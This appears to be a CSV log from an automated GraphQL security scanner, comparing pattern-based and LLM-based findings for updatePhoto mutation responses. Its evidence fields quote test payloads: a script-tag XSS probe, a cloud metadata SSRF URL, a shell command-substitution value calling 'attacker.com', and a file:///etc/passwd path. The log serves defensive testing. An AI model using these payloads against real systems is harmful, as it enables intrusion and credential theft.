timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-09-27T14:19:12.616020,updatePhoto_response_2,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T14:20:09.406167,updatePhoto_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response body contains a reflected XSS payload in the 'title' field. The unescaped <script> tag demonstrates that user-supplied input is directly embedded in the response without proper sanitization. When rendered in a browser, this payload would execute JavaScript, indicating a stored or reflected XSS vulnerability. The mutation operation (updatePhoto) suggests this payload could be stored and served to other users."", ""evidence"": ""title field contains: <script>alert('xss')</script>"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""title field contains: <script>alert('xss')</script>"", ""explanation"": ""The response body contains a reflected XSS payload in the 'title' field. The unescaped <script> tag demonstrates that user-supplied input is directly embedded in the response without proper sanitization. When rendered in a browser, this payload would execute JavaScript, indicating a stored or reflected XSS vulnerability. The mutation operation (updatePhoto) suggests this payload could be stored and served to other users.""}}]"
2025-09-27T14:26:21.419815,updatePhoto_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to 169.254.169.254, which is a well-known internal cloud metadata endpoint (AWS, Azure, GCP, etc.). This indicates the application processed a user-supplied internal URL. Accessing metadata services can expose sensitive cloud credentials, configuration data, and internal network details, confirming SSRF vulnerability. The null values in other fields suggest a partial mutation success, but the critical risk lies in the server's ability to interact with internal resources."", ""evidence"": ""thumbnailUrl: http://169.254.169.254/latest/meta-data/"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""thumbnailUrl: http://169.254.169.254/latest/meta-data/"", ""explanation"": ""The response contains a URL pointing to 169.254.169.254, which is a well-known internal cloud metadata endpoint (AWS, Azure, GCP, etc.). This indicates the application processed a user-supplied internal URL. Accessing metadata services can expose sensitive cloud credentials, configuration data, and internal network details, confirming SSRF vulnerability. The null values in other fields suggest a partial mutation success, but the critical risk lies in the server's ability to interact with internal resources.""}}]"
2025-09-27T14:26:59.790124,updatePhoto_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The returned title field contains the '$(curl attacker.com)' substring. This is a command substitution pattern used in Unix shell environments. The parentheses syntax actively attempts to execute a curl command to attacker.com when interpreted by a shell. While the response doesn't show execution symptoms, the injection payload appears unchanged in the output, indicating insufficient input sanitization. Given this mutation operation manipulates image data (updatePhoto) where server-side command execution (e.g., image processing) is plausible, this represents a critical OS command injection risk."", ""evidence"": ""Payload in title field: 'valid title$(curl attacker.com)'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""Payload in title field: 'valid title$(curl attacker.com)'"", ""explanation"": ""The returned title field contains the '$(curl attacker.com)' substring. This is a command substitution pattern used in Unix shell environments. The parentheses syntax actively attempts to execute a curl command to attacker.com when interpreted by a shell. While the response doesn't show execution symptoms, the injection payload appears unchanged in the output, indicating insufficient input sanitization. Given this mutation operation manipulates image data (updatePhoto) where server-side command execution (e.g., image processing) is plausible, this represents a critical OS command injection risk.""}}]"
2025-09-27T14:28:18.567066,updatePhoto_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: Path Injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response shows a successful mutation (updatePhoto) that accepted and returned a URL value containing a 'file://' URI scheme pointing to '/etc/passwd'. This file is a sensitive system file on Unix-based OSes. The server's acceptance and reflection of this path without sanitization indicate improper input validation. This could allow an attacker to read, write, or execute arbitrary server files if the application processes such paths, leading to system compromise. The 200 HTTP status confirms the request was processed as valid business logic."", ""evidence"": ""\""url\"": \""file:///etc/passwd\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Path Injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""\""url\"": \""file:///etc/passwd\"""", ""explanation"": ""The GraphQL response shows a successful mutation (updatePhoto) that accepted and returned a URL value containing a 'file://' URI scheme pointing to '/etc/passwd'. This file is a sensitive system file on Unix-based OSes. The server's acceptance and reflection of this path without sanitization indicate improper input validation. This could allow an attacker to read, write, or execute arbitrary server files if the application processes such paths, leading to system compromise. The 200 HTTP status confirms the request was processed as valid business logic.""}}]"
2025-09-27T14:28:40.016769,updatePhoto_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized user-supplied HTML tags (<h1>) in the 'title' field. This indicates the server isn't properly sanitizing input before storage/return. When rendered client-side without escaping, this could allow HTML injection attacks leading to XSS, defacement, or malicious content execution."", ""evidence"": ""title: '<h1>HTML Injection Test</h1>'"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.8, ""evidence"": ""title: '<h1>HTML Injection Test</h1>'"", ""explanation"": ""The response contains unsanitized user-supplied HTML tags (<h1>) in the 'title' field. This indicates the server isn't properly sanitizing input before storage/return. When rendered client-side without escaping, this could allow HTML injection attacks leading to XSS, defacement, or malicious content execution.""}}]"
2025-09-27T14:30:28.629767,updatePhoto_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T14:31:22.911682,updatePhoto_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T14:32:31.225141,updatePhoto_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T14:33:27.500800,updatePhoto_response_11,400,1,0,0.0,simple_only,,Information Disclosure,,1,0,0,0,0,0,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]",[]
